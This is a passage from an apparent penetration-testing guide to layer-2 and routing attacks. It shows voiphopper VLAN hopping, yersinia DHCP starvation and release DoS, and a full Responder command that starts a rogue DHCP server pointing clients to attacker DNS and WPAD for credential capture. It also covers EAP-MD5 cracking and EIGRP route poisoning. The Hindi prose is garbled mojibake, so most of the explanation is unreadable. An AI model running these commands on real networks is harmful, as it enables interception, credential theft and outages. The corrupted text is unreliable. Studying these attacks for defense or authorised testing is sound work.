2. **Spoof Mode** (`-c 1`): рд╡рд╛рд╕реНрддрд╡рд┐рдХ VoIP рдЙрдкрдХрд░рдг рдХреЗ рдкреИрдХреЗрдЯ рдХреА рдирдХрд▓ рдХрд░рддреЗ рд╣реБрдП рдХрд╕реНрдЯрдо рдкреИрдХреЗрдЯ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИред
3. **Spoof with Pre-made Packet Mode** (`-c 2`): рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ Cisco IP рдлреЛрди рдореЙрдбрд▓ рдХреЗ рдкреИрдХреЗрдЯ рдХреЗ рд╕рдорд╛рди рдкреИрдХреЗрдЯ рднреЗрдЬрддрд╛ рд╣реИред

рдЧрддрд┐ рдХреЗ рд▓рд┐рдП рдкрд╕рдВрджреАрджрд╛ рдореЛрдб рддреАрд╕рд░рд╛ рд╣реИред рдЗрд╕рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ:

* рд╣рдорд▓рд╛рд╡рд░ рдХрд╛ рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯрд░рдлреЗрд╕ (`-i` рдкреИрд░рд╛рдореАрдЯрд░)ред
* рдЕрдиреБрдХрд░рдг рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ VoIP рдЙрдкрдХрд░рдг рдХрд╛ рдирд╛рдо (`-E` рдкреИрд░рд╛рдореАрдЯрд░), рдЬреЛ Cisco рдирд╛рдордХрд░рдг рдкреНрд░рд╛рд░реВрдк рдХрд╛ рдкрд╛рд▓рди рдХрд░рддрд╛ рд╣реИ (рдЬреИрд╕реЗ, SEP рдХреЗ рдмрд╛рдж MAC рдкрддрд╛)ред

рдХреЙрд░реНрдкреЛрд░реЗрдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдореЗрдВ, рдПрдХ рдореМрдЬреВрджрд╛ VoIP рдЙрдкрдХрд░рдг рдХреА рдирдХрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдХреЛрдИ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

* рдлреЛрди рдкрд░ MAC рд▓реЗрдмрд▓ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред
* рдореЙрдбрд▓ рдЬрд╛рдирдХрд╛рд░реА рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдлреЛрди рдХреА рдбрд┐рд╕реНрдкреНрд▓реЗ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдореЗрдВ рдЬрд╛рдПрдБред
* VoIP рдЙрдкрдХрд░рдг рдХреЛ рд▓реИрдкрдЯреЙрдк рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдВ рдФрд░ Wireshark рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ CDP рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдЕрд╡рд▓реЛрдХрди рдХрд░реЗрдВред

рдЙрдкрдХрд░рдг рдХреЛ рддреАрд╕рд░реЗ рдореЛрдб рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрджрд╛рд╣рд░рдг рдХрдорд╛рдВрдб рд╣реЛрдЧрд╛:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP рд╣рдорд▓реЗ

#### рдЧрдгрдирд╛
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**DoS рдХреЗ рджреЛ рдкреНрд░рдХрд╛рд░** DHCP рд╕рд░реНрд╡рд░реЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдкрд╣рд▓рд╛ рдпрд╣ рд╣реИ рдХрд┐ **рдкрд░реНрдпрд╛рдкреНрдд рдирдХрд▓реА рд╣реЛрд╕реНрдЯ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░реЗрдВ рддрд╛рдХрд┐ рд╕рднреА рд╕рдВрднрд╛рд╡рд┐рдд IP рдкрддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ**ред\
рдпрд╣ рд╣рдорд▓рд╛ рдХреЗрд╡рд▓ рддрднреА рдХрд╛рдо рдХрд░реЗрдЧрд╛ рдЬрдм рдЖрдк DHCP рд╕рд░реНрд╡рд░ рдХреЗ рдЙрддреНрддрд░ рджреЗрдЦ рд╕рдХреЗрдВ рдФрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ рдкреВрд░рд╛ рдХрд░ рд╕рдХреЗрдВ (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server))ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрд╣ **Wifi рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ**ред

DHCP DoS рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реИ **DHCP-RELEASE рдкреИрдХреЗрдЯ рднреЗрдЬрдирд╛ рдЬрд┐рд╕рдореЗрдВ рд╕реНрд░реЛрдд рдХреЛрдб рдХреЗ рд░реВрдк рдореЗрдВ рд╣рд░ рд╕рдВрднрд╡ IP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдП**ред рдлрд┐рд░, рд╕рд░реНрд╡рд░ рд╕реЛрдЪреЗрдЧрд╛ рдХрд┐ рд╕рднреА рдиреЗ IP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рдорд╛рдкреНрдд рдХрд░ рджрд┐рдпрд╛ рд╣реИред
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
A more automatic way of doing this is using the tool [DHCPing](https://github.com/kamorin/DHCPig)

рдЖрдк рдЙрд▓реНрд▓реЗрдЦрд┐рдд DoS рд╣рдорд▓реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рд╡рд╛рддрд╛рд╡рд░рдг рдХреЗ рднреАрддрд░ рдирдП рд▓реАрдЬрд╝ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рд╡реИрдз рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡реЗ рдЕрдиреБрддреНрддрд░рджрд╛рдпреА рд╣реЛ рдЬрд╛рдПрдВред рдЗрд╕рд▓рд┐рдП рдЬрдм рд╡реИрдз рдкреБрдирдГ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ, **рдЖрдк рдЕрдЧрд▓реЗ рд╣рдорд▓реЗ рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦрд┐рдд рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдорд╛рди рд╕рд░реНрд╡рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

#### рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдорд╛рди рд╕реЗрдЯ рдХрд░реЗрдВ

рдПрдХ рдзреЛрдЦреЗрдмрд╛рдЬрд╝ DHCP рд╕рд░реНрд╡рд░ рдХреЛ `/usr/share/responder/DHCP.py` рдкрд░ рд╕реНрдерд┐рдд DHCP рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдиреЗрдЯрд╡рд░реНрдХ рд╣рдорд▓реЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИ, рдЬреИрд╕реЗ HTTP рдЯреНрд░реИрдлрд╝рд┐рдХ рдФрд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдирд╛, рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рд╕рд░реНрд╡рд░ рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░рдХреЗред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдПрдХ рдзреЛрдЦреЗрдмрд╛рдЬрд╝ рдЧреЗрдЯрд╡реЗ рд╕реЗрдЯ рдХрд░рдирд╛ рдХрдо рдкреНрд░рднрд╛рд╡реА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдХреЗрд╡рд▓ рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реЗ рдЖрдЙрдЯрдмрд╛рдЙрдВрдб рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЧреЗрдЯрд╡реЗ рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рдЫреВрдЯ рдЬрд╛рддреА рд╣реИрдВред рдЗрд╕рдХреЗ рдмрдЬрд╛рдп, рдПрдХ рдЕрдзрд┐рдХ рдкреНрд░рднрд╛рд╡реА рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдзреЛрдЦреЗрдмрд╛рдЬрд╝ DNS рдпрд╛ WPAD рд╕рд░реНрд╡рд░ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИред

рдиреАрдЪреЗ рдзреЛрдЦреЗрдмрд╛рдЬрд╝ DHCP рд╕рд░реНрд╡рд░ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдорд╛рдВрдб рд╡рд┐рдХрд▓реНрдк рджрд┐рдП рдЧрдП рд╣реИрдВ:

* **рд╣рдорд╛рд░рд╛ IP рдкрддрд╛ (рдЧреЗрдЯрд╡реЗ рд╡рд┐рдЬреНрдЮрд╛рдкрди)**: рдЕрдкрдиреЗ рдорд╢реАрди рдХреЗ IP рдХреЛ рдЧреЗрдЯрд╡реЗ рдХреЗ рд░реВрдк рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `-i 10.0.0.100` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
* **рд╕реНрдерд╛рдиреАрдп DNS рдбреЛрдореЗрди рдирд╛рдо**: рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ, рд╕реНрдерд╛рдиреАрдп DNS рдбреЛрдореЗрди рдирд╛рдо рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `-d example.org` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
* **рдореВрд▓ рд░рд╛рдЙрдЯрд░/рдЧреЗрдЯрд╡реЗ IP**: рд╡реИрдз рд░рд╛рдЙрдЯрд░ рдпрд╛ рдЧреЗрдЯрд╡реЗ рдХреЗ IP рдкрддреЗ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `-r 10.0.0.1` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
* **рдкреНрд░рд╛рдердорд┐рдХ DNS рд╕рд░реНрд╡рд░ IP**: рдЖрдк рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд┐рдП рдЧрдП рдзреЛрдЦреЗрдмрд╛рдЬрд╝ DNS рд╕рд░реНрд╡рд░ рдХреЗ IP рдкрддреЗ рдХреЛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `-p 10.0.0.100` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
* **рджреНрд╡рд┐рддреАрдпрдХ DNS рд╕рд░реНрд╡рд░ IP**: рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ, рджреНрд╡рд┐рддреАрдпрдХ DNS рд╕рд░реНрд╡рд░ IP рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `-s 10.0.0.1` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
* **рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдХрд╛ рдиреЗрдЯрдорд╛рд╕реНрдХ**: рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рд▓рд┐рдП рдиреЗрдЯрдорд╛рд╕реНрдХ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `-n 255.255.255.0` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
* **DHCP рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЗ рд▓рд┐рдП рдЗрдВрдЯрд░рдлрд╝реЗрд╕**: рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдкрд░ DHCP рдЯреНрд░реИрдлрд╝рд┐рдХ рд╕реБрдирдиреЗ рдХреЗ рд▓рд┐рдП `-I eth1` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
* **WPAD рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрддрд╛**: рд╡реЗрдм рдЯреНрд░реИрдлрд╝рд┐рдХ рдЗрдВрдЯрд░рд╕реЗрдкреНрд╢рди рдореЗрдВ рд╕рд╣рд╛рдпрддрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП WPAD рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рд▓рд┐рдП рдкрддрд╛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `-w тАЬhttp://10.0.0.100/wpad.datтАЭ` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
* **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЧреЗрдЯрд╡реЗ IP рдХреЛ рд╕реНрдкреВрдл рдХрд░реЗрдВ**: рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЧреЗрдЯрд╡реЗ IP рдкрддреЗ рдХреЛ рд╕реНрдкреВрдл рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `-S` рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВред
* **рд╕рднреА DHCP рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдЙрддреНрддрд░ рджреЗрдВ**: рд╕рднреА DHCP рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдЙрддреНрддрд░ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП `-R` рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВ, рд▓реЗрдХрд┐рди рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ рдпрд╣ рд╢реЛрд░ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЗрди рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХрд╛ рд╕рд╣реА рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдПрдХ рдзреЛрдЦреЗрдмрд╛рдЬрд╝ DHCP рд╕рд░реНрд╡рд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдкреНрд░рднрд╛рд╡реА рдврдВрдЧ рд╕реЗ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░рддрд╛ рд╣реИред
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP рд╣рдорд▓реЗ**

рдпрд╣рд╛рдБ рдХреБрдЫ рд╣рдорд▓реЗ рдХреА рд░рдгрдиреАрддрд┐рдпрд╛рдБ рд╣реИрдВ рдЬреЛ 802.1X рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХреЗ рдЦрд┐рд▓рд╛рдл рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ:

* EAP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдХреНрд░рд┐рдп рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдкрд╛рд╕рд╡рд░реНрдб рдЧреНрд░рд╛рдЗрдВрдбрд┐рдВрдЧ
* рдЧрд▓рдд EAP рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде RADIUS рд╕рд░реНрд╡рд░ рдкрд░ рд╣рдорд▓рд╛ _\*\*_(рд╢реЛрд╖рдг)
* EAP рд╕рдВрджреЗрд╢ рдХреИрдкреНрдЪрд░ рдФрд░ рдСрдлрд╝рд▓рд╛рдЗрди рдкрд╛рд╕рд╡рд░реНрдб рдХреНрд░реИрдХрд┐рдВрдЧ (EAP-MD5 рдФрд░ PEAP)
* TLS рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдорд╛рдиреНрдпрддрд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП EAP-MD5 рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдордЬрдмреВрд░ рдХрд░рдирд╛
* рд╣рдм рдпрд╛ рд╕рдорд╛рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рддреЗ рд╕рдордп рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд╝рд┐рдХ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдирд╛

рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ рдкреАрдбрд╝рд┐рдд рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ рд╣реИ, рддреЛ рд╡рд╣ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ EAP-MD5 рдореЗрдВ рдШрдЯрд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддрд╛ рд╣реИ (рдпрджрд┐ рдЖрд╡рд╢реНрдпрдХ рд╣реЛ) рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдпрд╛рд╕ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдлрд┐рд░, рд╡рд╣ рдЗрд╕реЗ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```
eapmd5pass тАУr pcap.dump тАУw /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рд╡рд░реНрдЧ рд╣реИ рдЬрд┐рд╕реЗ **рдПрдХ рдЧрд░реНрдо рдЕрддрд┐рд░рд┐рдХреНрдд рд░реВрдЯрд┐рдВрдЧ рдкреНрд░рдгрд╛рд▓реА рдмрдирд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред FHRP рдХреЗ рд╕рд╛рде, рднреМрддрд┐рдХ рд░рд╛рдЙрдЯрд░ рдХреЛ рдПрдХрд▓ рддрд╛рд░реНрдХрд┐рдХ рдбрд┐рд╡рд╛рдЗрд╕ рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рджреЛрд╖ рд╕рд╣рд┐рд╖реНрдгреБрддрд╛ рдХреЛ рдмрдврд╝рд╛рддрд╛ рд╣реИ рдФрд░ рд▓реЛрдб рдХреЛ рд╡рд┐рддрд░рд┐рдд рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред

**Cisco Systems рдХреЗ рдЗрдВрдЬреАрдирд┐рдпрд░реЛрдВ рдиреЗ рджреЛ FHRP рдкреНрд░реЛрдЯреЛрдХреЙрд▓, GLBP рдФрд░ HSRP рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдП рд╣реИрдВред**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Routing Information Protocol (RIP) рдХреЗ рддреАрди рд╕рдВрд╕реНрдХрд░рдг рдЬреНрдЮрд╛рдд рд╣реИрдВ: RIP, RIPv2, рдФрд░ RIPngред RIP рдФрд░ RIPv2 рджреНрд╡рд╛рд░рд╛ рдбрд╛рдЯрд╛рдЧреНрд░рд╛рдо рдХреЛ UDP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреЛрд░реНрдЯ 520 рдкрд░ рд╕рд╛рдерд┐рдпреЛрдВ рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрдмрдХрд┐ RIPng рджреНрд╡рд╛рд░рд╛ рдбрд╛рдЯрд╛рдЧреНрд░рд╛рдо рдХреЛ IPv6 рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ UDP рдкреЛрд░реНрдЯ 521 рдкрд░ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред RIPv2 рджреНрд╡рд╛рд░рд╛ MD5 рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рд╕рдорд░реНрдерди рдкреЗрд╢ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рджреВрд╕рд░реА рдУрд░, RIPng рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рджреЗрд╢реА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рд╢рд╛рдорд┐рд▓ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ; рдЗрд╕рдХреЗ рдмрдЬрд╛рдп, IPv6 рдореЗрдВ рд╡реИрдХрд▓реНрдкрд┐рдХ IPsec AH рдФрд░ ESP рд╣реЗрдбрд░ рдкрд░ рдирд┐рд░реНрднрд░рддрд╛ рд░рдЦреА рдЬрд╛рддреА рд╣реИред

* **RIP рдФрд░ RIPv2:** рд╕рдВрдЪрд╛рд░ UDP рдбрд╛рдЯрд╛рдЧреНрд░рд╛рдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреЛрд░реНрдЯ 520 рдкрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **RIPng:** IPv6 рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбрд╛рдЯрд╛рдЧреНрд░рд╛рдо рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП UDP рдкреЛрд░реНрдЯ 521 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ RIPv2 MD5 рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ рдЬрдмрдХрд┐ RIPng рд╕реНрд╡рджреЗрд╢реА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рд╢рд╛рдорд┐рд▓ рдирд╣реАрдВ рдХрд░рддрд╛, IPv6 рдореЗрдВ IPsec AH рдФрд░ ESP рд╣реЗрдбрд░ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** рдПрдХ рдЧрддрд┐рд╢реАрд▓ рд░реВрдЯрд┐рдВрдЧ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИред **рдпрд╣ рдПрдХ рджреВрд░реА-рд╡реЗрдХреНрддрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИред** рдпрджрд┐ **рдХреЛрдИ рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдФрд░ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдЗрдВрдЯрд░рдлреЗрд╕ рдХрд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдирд╣реАрдВ рд╣реИ, рддреЛ рдПрдХ **рдЖрдХреНрд░рдордгрдХрд╛рд░реА** EIGRP рд░реВрдЯрд┐рдВрдЧ рдореЗрдВ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рд░реВрдЯрд┐рдВрдЧ рддрд╛рд▓рд┐рдХрд╛рдУрдВ рдХреЛ рд╡рд┐рд╖рд╛рдХреНрдд** рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, EIGRP рдиреЗрдЯрд╡рд░реНрдХ (рджреВрд╕рд░реЗ рд╢рдмреНрджреЛрдВ рдореЗрдВ, рд╕реНрд╡рд╛рдпрддреНрдд рдкреНрд░рдгрд╛рд▓реА) **рд╕рдорддрд▓ рд╣реИ рдФрд░ рдХрд┐рд╕реА рднреА рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдирд╣реАрдВ рд╣реИ**ред рдпрджрд┐ рдПрдХ **рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдорд╛рд░реНрдЧ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИ**, рддреЛ рдпрд╣ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдпрд╣ рдорд╛рд░реНрдЧ рд╕реНрд╡рд╛рдпрддреНрдд EIGRP рдкреНрд░рдгрд╛рд▓реА рдореЗрдВ **рдлреИрд▓ рдЬрд╛рдПрдЧрд╛**ред

EIGRP рдкреНрд░рдгрд╛рд▓реА рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдПрдХ рд╡реИрдз EIGRP рд░рд╛рдЙрдЯрд░ рдХреЗ рд╕рд╛рде рдкрдбрд╝реЛрд╕ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ**, рдЬреЛ рдмреБрдирд┐рдпрд╛рджреА рдЕрдиреНрд╡реЗрд╖рдг рд╕реЗ рд▓реЗрдХрд░ рд╡рд┐рднрд┐рдиреНрди рдЗрдВрдЬреЗрдХреНрд╢рдиреЛрдВ рддрдХ рдХрдИ рд╕рдВрднрд╛рд╡рдирд╛рдУрдВ рдХреЛ рдЦреЛрд▓рддрд╛ рд╣реИред

